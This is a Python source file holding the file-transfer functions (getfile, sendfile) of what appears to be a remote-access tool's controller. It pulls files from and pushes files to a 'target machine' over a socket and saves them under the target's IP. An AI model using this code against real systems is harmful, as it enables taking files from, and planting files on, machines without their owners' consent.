import os


# to get file from target machine - getfile filepath command
def getfile(conn,cmd,ip):
    filepath=cmd.split(" ")[1]
    conn.send('capture'.encode())
    l=int(conn.recv(20480).decode())
    if l==0:
        print("Error in extracting file...try again")
        conn.send("Error".encode())
    else:
        print("Extracting file")
        conn.send("start".encode())
        filename=os.path.basename(filepath)
        f=open(os.path.join(ip,filename),"wb")
        curr_len=0
        while curr_len<l:
            print(end="\r")
            data=conn.recv(204800)
            curr_len+=len(data)
            f.write(data)
            print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")


        f.close()
        print("\ndone..")
        conn.send("done".encode())

    output=conn.recv(20480).decode()
    print(output,end="")

# to send file to target machine -sendfile filepath command
def sendfile(conn,cmd):
    filepath=cmd.split(" ")[1]
    try:
        f=open(filepath,"rb")
        data=f.read()
        print("Sending File")
        l=len(data)
        conn.send(str(l).encode())
        res=conn.recv(2048)
        conn.send(data)
        curr_len=0
        while curr_len<l:
            print(end="\r")
            x=int(conn.recv(20480).decode())
            curr_len+=x
            print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")


        print("\ndone..")
        conn.send("done".encode())
        f.close()
    except:
        print("Error sending file...try again")
        conn.send("0".encode())

    output=conn.recv(20480).decode()
    print(output,end="")
